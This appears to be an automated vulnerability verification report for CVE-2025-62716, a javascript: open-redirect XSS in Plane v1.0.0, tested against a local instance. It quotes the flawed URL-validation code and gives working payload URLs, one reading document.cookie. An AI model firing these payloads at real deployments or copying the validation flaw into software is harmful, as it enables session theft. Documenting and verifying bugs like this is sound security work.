============================================================
CVE-2025-62716 - Plane Open Redirect XSS Vulnerability
============================================================

[*] Checking if Plane service is running...
[+] Plane service is running

[*] Analyzing source code for vulnerable pattern...
[+] VULNERABLE CODE FOUND in authentication-wrapper.tsx:
    isValidURL() only blocks http/https/ftp schemes
    javascript: scheme bypasses validation and executes via router.push()

[*] Testing XSS with browser (MCP Browser Extension)...

[*] Step 1: Navigate to http://localhost:8080/?next_path=javascript:alert('XSS-CVE-2025-62716')
    As logged-in and onboarded user

[*] Step 2: Attempt screenshot
    Result: Timeout 30000ms exceeded - page blocked by JavaScript alert

[*] Step 3: Handle dialog (accept alert)
    Result: Successfully accepted alert dialog
    Code executed: await dialog.accept();

============================================================
[+] VULNERABILITY CONFIRMED!
[!] Plane v1.0.0 is VULNERABLE to CVE-2025-62716
============================================================

Verification Method:
- Browser navigation to malicious URL caused JavaScript alert to execute
- Screenshot operation timed out (blocked by alert)
- browser_handle_dialog successfully accepted the alert

Attack scenario:
1. Attacker crafts malicious URL (PrivilegesRequired: None):
   http://localhost:8080/?next_path=javascript:alert(document.cookie)
2. Victim (logged-in user) clicks the link (UserInteraction: Required)
3. JavaScript executes in victim's browser context

Root Cause:
- isValidURL() function only blocks http/https/ftp schemes
- javascript: scheme passes validation and is used in router.push()
- Client-side redirection executes arbitrary JavaScript

Vulnerable Code (authentication-wrapper.tsx):
```typescript
const isValidURL = (url: string): boolean => {
  const disallowedSchemes = /^(https?|ftp):\/\//i;
  return !disallowedSchemes.test(url);  // javascript: returns true (valid)
};

// Later in the code:
if (nextPath && isValidURL(nextPath.toString())) {
  redirectionRoute = nextPath.toString();
}
router.push(currentRedirectRoute);  // Executes javascript: URL
```

Impact: Session hijacking, data theft, account takeover, privilege escalation
